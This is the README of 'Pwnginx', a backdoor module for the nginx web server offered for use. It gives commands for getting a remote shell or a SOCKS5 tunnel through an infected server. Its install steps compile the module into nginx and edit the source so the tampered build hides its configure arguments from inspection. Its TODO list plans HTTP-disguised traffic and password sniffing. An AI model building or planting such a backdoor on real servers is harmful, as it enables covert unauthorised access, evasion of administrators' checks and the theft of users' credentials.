#[ Pwnginx ] - Pwn nginx

Copyleft by t57root @ openwill.me

&lt;t57root@gmail.com>  [www.HackShell.net](http://www.hackshell.net/)

Usage:

Get a shell access via the nginx running @ [ip]:[port]

    ./pwnginx shell [ip] [port]

Get a socks5 tunnel listening at [socks5ip]:[socks5port]

    ./pwnginx socks5 [ip] [port] [socks5ip] [socks5port]


###INSTALL:

* Compile the client:

    $ cd client;make

* Edit source to hidden configure arguments:

    $ vim src/core/nginx.c
    
    Modify the `configure arguments` line into: "configure arguments: --prefix=/opt/nginx\n");

* Recompile the nginx:

    $ cd /path/to/nginx/source; ./configure --prefix=/opt/nginx --add-module=/path/to/pwnginx/module && make && make install


###TODO:

* Pack communication traffic into HTTP protocol

* http password sniff

* Full pty support
